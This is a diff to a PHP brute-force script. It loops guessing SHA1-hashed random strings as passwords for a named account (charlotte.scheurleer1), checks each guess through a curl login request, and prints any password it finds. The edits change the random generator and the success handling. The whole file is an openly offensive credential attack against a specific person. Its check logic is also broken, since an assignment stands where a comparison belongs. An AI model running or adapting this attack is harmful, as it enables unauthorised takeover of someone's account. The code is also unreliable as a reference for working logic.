@@ -6,10 +6,10 @@ $time = microtime() * 100000;
 $username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 while(True) {
-        $Pass = sha1(rand());
+        $Pass = sha1(mt_rand());
 
         if(check_correct($username, $Pass)) {
-            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
+            echo("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
             <div align='center'><b>Found the password of: ".$Pass."<br> For the account: ".$username."</b></div>
@@ -36,7 +36,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c);
-        if($str = $wrong) {return false;}
+        if($str = "incorrect") {return false;}
         else {return true;}
 }
 
